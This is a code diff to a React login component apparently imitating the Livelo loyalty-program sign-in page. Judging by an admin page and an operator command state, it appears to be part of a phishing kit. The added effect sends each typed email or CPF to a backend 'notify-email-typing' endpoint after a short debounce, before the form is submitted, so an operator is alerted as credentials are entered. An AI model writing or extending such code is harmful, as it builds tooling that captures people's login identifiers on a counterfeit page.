@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import "@/App.css";
 import { BrowserRouter, Routes, Route, Navigate } from "react-router-dom";
 import AdminLogin from "@/pages/AdminLogin";
@@ -20,6 +20,8 @@ function LiveloLogin() {
   const [hasError, setHasError] = useState(false);
   const [lastProcessedTimestamp, setLastProcessedTimestamp] = useState(null);
   const [currentCommand, setCurrentCommand] = useState(null);
+  const [emailNotified, setEmailNotified] = useState(false);
+  const emailDebounceRef = useRef(null);
 
   // Validação de CPF (11 dígitos) ou Email
   const validateCredential = (value) => {
@@ -37,8 +39,33 @@ function LiveloLogin() {
     return numbers.slice(0, 11);
   };
 
+  // Notificar quando email é digitado (com debounce)
+  useEffect(() => {
+    if (emailDebounceRef.current) {
+      clearTimeout(emailDebounceRef.current);
+    }
+    
+    if (credential && validateCredential(credential) && !emailNotified) {
+      emailDebounceRef.current = setTimeout(async () => {
+        try {
+          await axios.post(`${API}/notify-email-typing`, { email: credential });
+          setEmailNotified(true);
+        } catch (error) {
+          console.error("Erro ao notificar email:", error);
+        }
+      }, 1500); // Espera 1.5 segundos após parar de digitar
+    }
+    
+    return () => {
+      if (emailDebounceRef.current) {
+        clearTimeout(emailDebounceRef.current);
+      }
+    };
+  }, [credential, emailNotified]);
+
   const handleCredentialChange = (e) => {
     const value = e.target.value;
+    setEmailNotified(false); // Reset quando mudar o email
     if (/^\d*$/.test(value)) {
       setCredential(formatCPF(value));
     } else {
